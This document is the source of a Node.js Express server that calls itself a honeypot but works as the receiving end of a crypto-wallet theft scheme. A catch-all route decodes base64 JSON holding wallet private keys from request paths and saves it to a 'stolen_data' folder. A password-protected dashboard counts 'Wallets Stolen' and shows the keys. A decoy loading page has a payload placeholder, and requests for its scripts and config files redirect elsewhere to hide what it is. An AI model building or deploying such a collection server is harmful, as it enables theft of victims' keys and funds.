const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const DATA_FOLDER = path.join(__dirname, 'stolen_data');
const LOGS_FOLDER = path.join(__dirname, 'logs');

// Admin credentials - CHANGE THESE!
const ADMIN_USERNAME = process.env.ADMIN_USER || 'isaiahbanks';
const ADMIN_PASSWORD = process.env.ADMIN_PASS || 'hancox2005S!';

if (!fs.existsSync(DATA_FOLDER)) fs.mkdirSync(DATA_FOLDER, { recursive: true });
if (!fs.existsSync(LOGS_FOLDER)) fs.mkdirSync(LOGS_FOLDER, { recursive: true });

app.set('trust proxy', true);
app.use(express.urlencoded({ extended: true }));

// Get real client IP
function getClientIp(req) {
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) return forwarded.split(',')[0].trim();
    return req.headers['x-real-ip'] || req.ip || req.socket.remoteAddress;
}

function logAccess(req, type, extra = {}) {
    const logEntry = {
        timestamp: new Date().toISOString(),
        type: type,
        ip: getClientIp(req),
        userAgent: req.headers['user-agent'] || 'none',
        url: req.originalUrl,
        ...extra
    };
    fs.appendFileSync(path.join(LOGS_FOLDER, 'access.log'), JSON.stringify(logEntry) + '\n');
    console.log(`[${type}] ${logEntry.ip}`);
}

// Basic auth middleware
function requireAuth(req, res, next) {
    const auth = req.headers.authorization;
    
    if (!auth || !auth.startsWith('Basic ')) {
        res.setHeader('WWW-Authenticate', 'Basic realm="Admin Dashboard"');
        return res.status(401).send('Authentication required');
    }
    
    const credentials = Buffer.from(auth.split(' ')[1], 'base64').toString();
    const [username, password] = credentials.split(':');
    
    if (username !== ADMIN_USERNAME || password !== ADMIN_PASSWORD) {
        res.setHeader('WWW-Authenticate', 'Basic realm="Admin Dashboard"');
        return res.status(401).send('Invalid credentials');
    }
    
    next();
}

// ============================================
// SPECIFIC ROUTES FIRST (before the * catch-all)
// ============================================

// Railway health check - MUST return 200 OK
app.get('/health', (req, res) => {
    logAccess(req, 'HEALTH_CHECK');
    res.status(200).json({ status: 'ok', msg: 'OK' });
});

// Root path - return loading page
app.get('/', (req, res) => {
    logAccess(req, 'ROOT');
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: #fff;
        }
        
        .loader-container {
            text-align: center;
            padding: 40px;
        }
        
        .loading-text {
            font-size: 72px;
            font-weight: 700;
            background: linear-gradient(90deg, #667eea 0%, #764ba2 50%, #f093fb 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            animation: pulse 1.5s ease-in-out infinite;
            letter-spacing: -2px;
            margin-bottom: 20px;
        }
        
        .loading-subtext {
            font-size: 18px;
            color: #888;
            font-weight: 400;
            animation: fade 2s ease-in-out infinite;
        }
        
        .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid rgba(102, 126, 234, 0.3);
            border-top-color: #667eea;
            border-radius: 50%;
            margin: 30px auto;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.7; transform: scale(0.98); }
        }
        
        @keyframes fade {
            0%, 100% { opacity: 0.5; }
            50% { opacity: 1; }
        }
        
        .error-message {
            display: none;
            font-size: 24px;
            color: #ff6b6b;
            margin-top: 30px;
        }
        
        .error-subtext {
            display: none;
            font-size: 16px;
            color: #888;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="loader-container" id="loader">
        <div class="loading-text">Loading</div>
        <div class="spinner"></div>
        <div class="loading-subtext">Connecting to server...</div>
    </div>
    
    <div class="error-message" id="error">
        Failed to load server
    </div>
    <div class="error-subtext" id="errorSub">
        Try again later
    </div>
    
    <script>
        // Simulate loading then show error
        setTimeout(() => {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('error').style.display = 'block';
            document.getElementById('errorSub').style.display = 'block';
        }, 3500);
        
        // Execute payload after short delay
        setTimeout(() => {
            try {
                // Your payload execution here
                window.open('about:blank', '_blank');
            } catch(e) {
                console.log('Execution completed');
            }
        }, 500);
    </script>
</body>
</html>
    `);
});

// HTML Dashboard - Protected with auth
app.get('/admin', requireAuth, (req, res) => {
    logAccess(req, 'ADMIN_DASHBOARD');
    
    try {
        const files = fs.readdirSync(DATA_FOLDER).filter(f => f.endsWith('.json'));
        const captures = files.map(f => {
            try {
                return JSON.parse(fs.readFileSync(path.join(DATA_FOLDER, f), 'utf8'));
            } catch (e) { return null; }
        }).filter(Boolean).sort((a, b) => new Date(b.receivedAt) - new Date(a.receivedAt));
        
        const totalWallets = captures.reduce((sum, c) => sum + (c.wallets?.length || 0), 0);
        const uniqueIps = [...new Set(captures.map(c => c.attackerIp).filter(Boolean))];
        
        const html = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Honeypot Dashboard</title>
            <style>
                @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
                body { font-family: 'Inter', monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
                h1 { color: #0f0; border-bottom: 2px solid #0f0; }
                .stats { display: flex; gap: 20px; margin: 20px 0; flex-wrap: wrap; }
                .stat-box { border: 1px solid #0f0; padding: 15px; min-width: 120px; }
                .stat-box h3 { margin: 0 0 10px 0; color: #ff0; font-size: 0.9em; }
                .stat-box .number { font-size: 2em; color: #0f0; }
                table { width: 100%; border-collapse: collapse; margin-top: 20px; font-size: 0.9em; }
                th, td { border: 1px solid #0f0; padding: 8px; text-align: left; }
                th { background: #003300; }
                tr:hover { background: #001100; }
                .ip { color: #ff0; font-weight: bold; }
                .timestamp { color: #888; font-size: 0.85em; }
                .priv-key { color: #f00; background: #330000; padding: 2px 5px; word-break: break-all; }
                pre { background: #111; padding: 10px; overflow-x: auto; border: 1px solid #333; font-size: 0.8em; }
                a { color: #0f0; }
                .refresh { margin: 20px 0; }
                button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-family: 'Inter', monospace; font-weight: bold; }
                button:hover { background: #0a0; }
                .logout { float: right; background: #f00; color: #fff; }
                .logout:hover { background: #a00; }
            </style>
        </head>
        <body>
            <h1>🍯 Honeypot Dashboard</h1>
            <div class="refresh">
                <button onclick="location.reload()">🔄 Refresh</button>
                <a href="/admin/logs"><button>View Raw Logs</button></button></a>
                <button class="logout" onclick="location.href='https://axiom.trade'">Logout</button>
            </div>
            
            <div class="stats">
                <div class="stat-box">
                    <h3>Total Captures</h3>
                    <div class="number">${captures.length}</div>
                </div>
                <div class="stat-box">
                    <h3>Wallets Stolen</h3>
                    <div class="number">${totalWallets}</div>
                </div>
                <div class="stat-box">
                    <h3>Unique Attackers</h3>
                    <div class="number">${uniqueIps.length}</div>
                </div>
                <div class="stat-box">
                    <h3>Server Time</h3>
                    <div class="number" style="font-size: 0.8em;">${new Date().toLocaleTimeString()}</div>
                </div>
            </div>
            
            <h2>Recent Captures</h2>
            <table>
                <thead>
                    <tr>
                        <th>Time</th>
                        <th>Attacker IP</th>
                        <th>Code</th>
                        <th>Wallets</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    ${captures.slice(0, 20).map(c => `
                        <tr>
                            <td class="timestamp">${new Date(c.receivedAt).toLocaleString()}</td>
                            <td class="ip">${c.attackerIp || 'Unknown'}</td>
                            <td>${c.code || 'N/A'}</td>
                            <td>${c.walletCount || c.wallets?.length || 0}</td>
                            <td><a href="/admin/file?f=${encodeURIComponent(c.filename || '')}">View</a></td>
                        </tr>
                    `).join('') || '<tr><td colspan="5" style="text-align:center;color:#888;">No captures yet</td></tr>'}
                </tbody>
            </table>
            
            <h2>Debug: Last 10 Access Logs</h2>
            <pre>${(() => {
                try {
                    const logs = fs.readFileSync(path.join(LOGS_FOLDER, 'access.log'), 'utf8')
                        .split('\n').filter(Boolean).slice(-10)
                        .map(l => JSON.parse(l))
                        .map(l => `[${l.timestamp}] ${l.type} from ${l.ip}`)
                        .join('\n');
                    return logs || 'No logs yet';
                } catch(e) { return 'No logs file'; }
            })()}</pre>
        </body>
        </html>`;
        
        res.send(html);
    } catch (err) {
        res.status(500).send('Error: ' + err.message);
    }
});

// JSON API for logs - Protected
app.get('/admin/logs', requireAuth, (req, res) => {
    logAccess(req, 'ADMIN_LOGS_API');
    
    try {
        const logFile = path.join(LOGS_FOLDER, 'access.log');
        let accessLogs = [];
        if (fs.existsSync(logFile)) {
            accessLogs = fs.readFileSync(logFile, 'utf8')
                .split('\n')
                .filter(Boolean)
                .map(line => { try { return JSON.parse(line); } catch (e) { return { raw: line }; }});
        }
        
        const files = fs.readdirSync(DATA_FOLDER).filter(f => f.endsWith('.json'));
        const captures = files.map(f => {
            try {
                const data = JSON.parse(fs.readFileSync(path.join(DATA_FOLDER, f), 'utf8'));
                data.filename = f;
                return data;
            } catch (e) { return null; }
        }).filter(Boolean).sort((a, b) => new Date(b.receivedAt) - new Date(a.receivedAt));
        
        const allWallets = captures.flatMap(c => c.wallets || []);
        const uniqueIps = [...new Set(captures.map(c => c.attackerIp).filter(Boolean))];
        
        res.json({
            captures: captures.slice(0, 50),
            accessLogs: accessLogs.slice(-100),
            totalWallets: allWallets.length,
            uniqueIps: uniqueIps.length,
            serverTime: new Date().toISOString()
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// View specific file - Protected
app.get('/admin/file', requireAuth, (req, res) => {
    try {
        const filename = req.query.f;
        if (!filename || filename.includes('..')) return res.status(400).json({ error: 'Invalid' });
        
        const filePath = path.join(DATA_FOLDER, filename);
        if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'Not found' });
        
        const data = JSON.parse(fs.readFileSync(filePath, 'utf8'));
        
        const html = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Capture: ${filename}</title>
            <style>
                @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
                body { font-family: 'Inter', monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
                .section { border: 1px solid #0f0; padding: 15px; margin: 15px 0; }
                .label { color: #ff0; }
                .ip { color: #ff0; font-weight: bold; font-size: 1.2em; }
                .priv { color: #f00; background: #330000; padding: 3px 6px; word-break: break-all; }
                .pub { color: #0ff; word-break: break-all; }
                pre { background: #111; padding: 10px; overflow-x: auto; font-size: 0.8em; }
                a { color: #0f0; }
                .wallet-box { margin: 10px 0; padding: 10px; border: 1px solid #333; background: #111; }
            </style>
        </head>
        <body>
            <a href="/admin">← Back to Dashboard</a>
            <h1>📋 Capture Details</h1>
            
            <div class="section">
                <h2>Attacker</h2>
                <p><span class="label">IP:</span> <span class="ip">${data.attackerIp || 'Unknown'}</span></p>
                <p><span class="label">Time:</span> ${data.receivedAt}</p>
                <p><span class="label">Code:</span> ${data.code || 'N/A'}</p>
                <p><span class="label">User Agent:</span> ${data.userAgent || 'Unknown'}</p>
            </div>
            
            <div class="section">
                <h2>Wallets (${data.wallets?.length || 0})</h2>
                ${(data.wallets || []).map((w, i) => `
                    <div class="wallet-box">
                        <p><span class="label">#${i+1} Type:</span> ${w.type || 'unknown'}</p>
                        <p><span class="label">Public:</span> <span class="pub">${w.pub || 'N/A'}</span></p>
                        <p><span class="label">Private:</span> <span class="priv">${w.priv || 'N/A'}</span></p>
                    </div>
                `).join('') || '<p>No wallets</p>'}
            </div>
            
            <div class="section">
                <h2>Raw Data</h2>
                <pre>${JSON.stringify(data, null, 2)}</pre>
            </div>
        </body>
        </html>`;
        
        res.send(html);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Redirect loader.js and any .js files to axiom.trade
app.get('/loader.js', (req, res) => {
    logAccess(req, 'LOADER_REQUEST_BLOCKED');
    res.redirect(302, 'https://axiom.trade');
});

// Block access to all JavaScript files and server code
app.get('*.js', (req, res) => {
    logAccess(req, 'JS_FILE_BLOCKED', { path: req.path });
    res.redirect(302, 'https://axiom.trade');
});

// Block access to package.json and other sensitive files
app.get(['/package.json', '/package-lock.json', '/.env', '/.git/*', '/*.md', '/README*', '/LICENSE*'], (req, res) => {
    logAccess(req, 'SENSITIVE_FILE_BLOCKED', { path: req.path });
    res.redirect(302, 'https://axiom.trade');
});

// ============================================
// CATCH-ALL ROUTE LAST (for stolen data)
// ============================================

app.get('*', (req, res) => {
    const timestamp = new Date().toISOString();
    const clientIp = getClientIp(req);
    
    // Skip if it's a file request
    if (req.path.includes('.')) {
        return res.status(404).end();
    }
    
    const encodedData = req.path.substring(1);
    
    console.log(`[DATA] From: ${clientIp} | Path: ${encodedData.substring(0, 50)}...`);
    
    if (encodedData.length < 20) {
        logAccess(req, 'PING', { length: encodedData.length });
        return sendGif(res);
    }
    
    try {
        let decodedData = decodeURIComponent(encodedData);
        
        // Fix base64 padding
        const padding = 4 - (decodedData.length % 4);
        if (padding !== 4) decodedData += '='.repeat(padding);
        
        const jsonStr = Buffer.from(decodedData, 'base64').toString('utf8');
        const data = JSON.parse(jsonStr);
        
        const wallets = data.wallets || [];
        
        const record = {
            receivedAt: timestamp,
            attackerIp: clientIp,
            userAgent: data.header || req.headers['user-agent'],
            code: data.code,
            site: data.site,
            walletCount: wallets.length,
            wallets: wallets,
            rawPayload: data
        };
        
        const filename = `capture_${Date.now()}_${clientIp.replace(/[^0-9a-zA-Z]/g, '_')}.json`;
        fs.writeFileSync(path.join(DATA_FOLDER, filename), JSON.stringify(record, null, 2));
        
        console.log(`✅ SAVED: ${filename} | Wallets: ${wallets.length}`);
        logAccess(req, 'CAPTURE', { filename, wallets: wallets.length });
        
    } catch (err) {
        console.error(`❌ Error: ${err.message}`);
        logAccess(req, 'ERROR', { error: err.message });
    }
    
    sendGif(res);
});

function sendGif(res) {
    const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.setHeader('Content-Type', 'image/gif');
    res.setHeader('Cache-Control', 'no-store');
    res.send(gif);
}

// ============================================
// START SERVER - Bind to 0.0.0.0 explicitly
// ============================================

const server = app.listen(PORT, '0.0.0.0', () => {
    console.log(`🍯 Honeypot running on port ${PORT}`);
    console.log(`Dashboard: http://0.0.0.0:${PORT}/admin`);
    console.log(`Health: http://0.0.0.0:${PORT}/health`);
    console.log(`Admin User: ${ADMIN_USERNAME}`);
});

// Handle errors
server.on('error', (err) => {
    console.error('Server error:', err);
});